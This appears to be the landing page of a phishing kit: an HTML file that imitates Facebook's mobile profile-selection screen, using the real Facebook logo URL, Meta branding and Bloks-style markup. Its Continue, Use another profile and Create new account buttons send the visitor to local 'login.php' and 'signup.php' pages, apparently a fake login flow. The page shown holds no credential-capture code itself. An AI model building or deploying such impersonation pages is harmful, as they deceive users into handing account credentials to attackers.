<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <meta name="theme-color" content="#1877F2" />
  <title>Facebook</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="preconnect" href="https://static.xx.fbcdn.net">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      width: 100%;
      font-family: "Optimistic 95", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fff;
      color: rgb(10, 19, 23);
      overflow-x: hidden;
      display: flex;
      flex-direction: column;
      -webkit-tap-highlight-color: transparent;
    }

    #container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      width: 100%;
      min-height: 100vh;
      padding: 20px 16px;
      box-sizing: border-box;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 40px;
      margin-bottom: 40px;
      width: 100%;
      max-width: 200px;
    }

    .logo-container img {
      max-height: 48px;
      min-height: 48px;
      width: auto;
      object-fit: contain;
      display: block;
    }

    .lele-section {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      gap: 16px;
      margin-bottom: 24px;
    }

    .vaprofile-button {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 56px;
      border-radius: 22px;
      font-size: 15.2px;
      font-weight: 500;
      font-family: "Optimistic 95", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      cursor: pointer;
      border: none;
      transition: all 0.2s ease;
      text-decoration: none;
      box-sizing: border-box;
      pointer-events: inherit;
      position: relative;
      overflow: hidden;
    }

    .profile-button.primary {
      background-color: #1877F2;
      color: #fff;
    }

    .profile-button.primary:hover {
      background-color: #166FE5;
      transform: scale(1.02);
    }

    .profile-button.primary:active {
      background-color: #1465CC;
      transform: scale(0.98);
    }

    .profile-button.secondary {
      background-color: transparent;
      color: rgb(10, 19, 23);
      border: 1px solid #DADDE1;
    }

    .profile-button.secondary:hover {
      background-color: #F0F2F5;
    }

    .profile-button.secondary:active {
      background-color: #E4E6EA;
      transform: scale(0.98);
    }

    .profile-button.outline {
      background-color: transparent;
      color: rgb(0, 100, 224);
      border: 1px solid rgb(0, 100, 224);
    }

    .profile-button.outline:hover {
      background-color: rgba(0, 100, 224, 0.05);
    }

    .profile-button.outline:active {
      background-color: rgba(0, 100, 224, 0.1);
      transform: scale(0.98);
    }

    .button-text {
      display: inline;
      white-space: pre-wrap;
      overflow-wrap: break-word;
      font-size: 15.2px;
      font-weight: 500;
      font-family: "Optimistic 95", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    .divider {
      width: 100%;
      max-width: 400px;
      height: 1px;
      background-color: #DADDE1;
      margin: 24px 0;
    }

    .icon-container {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 24px;
      height: 24px;
      margin-right: 8px;
    }

    .icon-container img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      overflow: hidden;
    }

    .footer-links {
      margin-top: auto;
      padding-top: 24px;
      padding-bottom: 20px;
      text-align: center;
      font-size: 12px;
      color: #8A8D91;
      width: 100%;
    }

    .footer-links a {
      color: #8A8D91;
      text-decoration: none;
      margin: 0 4px;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    @media (max-width: 360px) {
      .logo-container {
        margin-top: 20px;
        margin-bottom: 30px;
      }

      .profile-section {
        gap: 12px;
      }

      .profile-button {
        height: 48px;
        font-size: 14px;
      }
    }

    @media (prefers-color-scheme: dark) {
      body {
        background-color: #18191A;
        color: #E4E6EA;
      }

      .profile-button.secondary {
        border-color: #3A3B3C;
        color: #E4E6EA;
      }

      .profile-button.secondary:hover {
        background-color: #242526;
      }

      .profile-button.secondary:active {
        background-color: #2F3031;
      }

      .divider {
        background-color: #3A3B3C;
      }
    }
  </style>
</head>
<body>
  <div id="container">
    <div class="logo-container">
      <img 
        data-bloks-name="bk.components.Image" 
        role="heading" 
        alt="Facebook from Meta" 
        class="wbloks_1" 
        src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" 
        style="max-height: 48px; min-height: 48px; object-fit: contain; overflow: hidden;"
      />
    </div>

    <div class="profile-section">
      <button 
        data-bloks-name="bk.components.Flexbox" 
        tabindex="0" 
        role="button" 
        aria-label="Continue" 
        data-anchor-id="replay" 
        class="profile-button primary wbloks_1"
        onclick="handleContinue()"
      >
        <span class="button-text">Continue</span>
      </button>

      <button 
        data-bloks-name="bk.components.Flexbox" 
        tabindex="0" 
        role="button" 
        aria-label="Use another profile" 
        data-anchor-id="replay" 
        class="profile-button secondary wbloks_1"
        onclick="handleUseAnotherProfile()"
      >
        <span class="button-text">Use another profile</span>
      </button>
    </div>

    <div class="divider"></div>

    <div class="profile-section">
      <button 
        data-bloks-name="bk.components.Flexbox" 
        tabindex="0" 
        role="button" 
        aria-label="Create new account" 
        data-anchor-id="replay" 
        class="profile-button outline wbloks_1"
        onclick="handleCreateAccount()"
      >
        <span class="button-text" style="color: rgb(0, 100, 224);">Create new account</span>
      </button>
    </div>

    <div class="footer-links">
      <a href="#">About</a> · 
      <a href="#">Help</a> · 
      <a href="#">More</a>
    </div>
  </div>

  <script>
    function handleContinue() {
      // Redirect to login page or continue with selected profile
      window.location.href = 'login.php';
    }

    function handleUseAnotherProfile() {
      // Show profile selection or redirect to login
      window.location.href = 'login.php';
    }

    function handleCreateAccount() {
      // Redirect to signup page
      window.location.href = 'signup.php';
    }

    // Prevent default link behavior
    document.addEventListener('DOMContentLoaded', function() {
      const buttons = document.querySelectorAll('.profile-button');
      buttons.forEach(button => {
        button.addEventListener('click', function(e) {
          e.preventDefault();
        });
      });
    });
  </script>
</body>
</html>
